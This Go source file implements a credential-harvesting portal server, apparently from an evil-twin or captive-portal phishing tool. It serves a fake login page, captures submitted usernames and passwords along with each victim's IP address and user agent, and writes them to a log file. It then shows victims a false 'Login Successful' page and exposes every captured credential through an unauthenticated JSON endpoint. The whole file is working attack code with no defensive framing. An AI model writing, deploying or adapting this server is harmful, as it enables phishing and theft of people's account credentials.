package server

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"sync"
	"time"
)

type Credential struct {
	Login     string    `json:"login"`
	Password  string    `json:"password"`
	Timestamp time.Time `json:"timestamp"`
	IP        string    `json:"ip,omitempty"`
	UserAgent string    `json:"user_agent,omitempty"`
}

type PortalServer struct {
	server      *http.Server
	mu          sync.Mutex
	running     bool
	credentials []Credential
	templateDir string
	logPath     string
	portalIP    string
}

func NewPortalServer(templateDir, logPath, portalIP string) *PortalServer {
	return &PortalServer{
		templateDir: templateDir,
		logPath:     logPath,
		portalIP:    portalIP,
		credentials: []Credential{},
	}
}

func (ps *PortalServer) Start(port string) error {
	ps.mu.Lock()
	defer ps.mu.Unlock()

	if ps.running {
		return fmt.Errorf("portal server already running")
	}

	ensureLogDir(ps.logPath)

	mux := http.NewServeMux()
	mux.HandleFunc("/", ps.handleRoot)
	mux.HandleFunc("/login", ps.handleLogin)
	mux.HandleFunc("/success", ps.handleSuccess)
	mux.HandleFunc("/api/credentials", ps.handleCredentials)

	ps.server = &http.Server{
		Addr:    port,
		Handler: mux,
	}

	ps.running = true
	go func() {
		if err := ps.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			fmt.Fprintf(os.Stderr, "portal server error: %v\n", err)
		}
	}()

	return nil
}

func (ps *PortalServer) Stop() error {
	ps.mu.Lock()
	defer ps.mu.Unlock()

	if !ps.running {
		return nil
	}

	if ps.server != nil {
		if err := ps.server.Close(); err != nil {
			return err
		}
	}

	ps.running = false
	return nil
}

func (ps *PortalServer) IsRunning() bool {
	ps.mu.Lock()
	defer ps.mu.Unlock()
	return ps.running
}

func (ps *PortalServer) handleRoot(w http.ResponseWriter, r *http.Request) {
	templatePath := filepath.Join(ps.templateDir, "templates", "login.html")
	if _, err := os.Stat(templatePath); err != nil {
		templatePath = filepath.Join(ps.templateDir, "login.html")
	}

	data, err := os.ReadFile(templatePath)
	if err != nil {
		http.Error(w, "login page not found", http.StatusNotFound)
		return
	}

	// Simple replacement for Jinja2-style syntax if needed
	content := string(data)

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(content))
}

func (ps *PortalServer) handleLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}

	r.ParseForm()
	login := r.FormValue("login")
	password := r.FormValue("password")

	if login == "" || password == "" {
		http.Error(w, "login and password required", http.StatusBadRequest)
		return
	}

	cred := Credential{
		Login:     login,
		Password:  password,
		Timestamp: time.Now(),
		IP:        r.RemoteAddr,
		UserAgent: r.Header.Get("User-Agent"),
	}

	ps.mu.Lock()
	ps.credentials = append(ps.credentials, cred)
	ps.mu.Unlock()

	// Log to file
	ps.logCredential(cred)

	// Redirect to success page
	http.Redirect(w, r, "/success", http.StatusSeeOther)
}

func (ps *PortalServer) handleSuccess(w http.ResponseWriter, r *http.Request) {
	templatePath := filepath.Join(ps.templateDir, "templates", "login_successful.html")
	if _, err := os.Stat(templatePath); err != nil {
		templatePath = filepath.Join(ps.templateDir, "login_successful.html")
	}

	data, err := os.ReadFile(templatePath)
	if err != nil {
		// Fallback success message
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(`<html><body><h1>Login Successful</h1><p>You may close this window.</p></body></html>`))
		return
	}

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write(data)
}

func (ps *PortalServer) handleCredentials(w http.ResponseWriter, r *http.Request) {
	ps.mu.Lock()
	creds := make([]Credential, len(ps.credentials))
	copy(creds, ps.credentials)
	ps.mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(creds)
}

func (ps *PortalServer) logCredential(cred Credential) {
	logDir := filepath.Dir(ps.logPath)
	os.MkdirAll(logDir, 0o755)

	f, err := os.OpenFile(ps.logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to open credential log: %v\n", err)
		return
	}
	defer f.Close()

	data, _ := json.Marshal(cred)
	f.WriteString(string(data) + "\n")
}

func ensureLogDir(logPath string) {
	dir := filepath.Dir(logPath)
	os.MkdirAll(dir, 0o755)
}

func (ps *PortalServer) GetCredentials() []Credential {
	ps.mu.Lock()
	defer ps.mu.Unlock()
	creds := make([]Credential, len(ps.credentials))
	copy(creds, ps.credentials)
	return creds
}
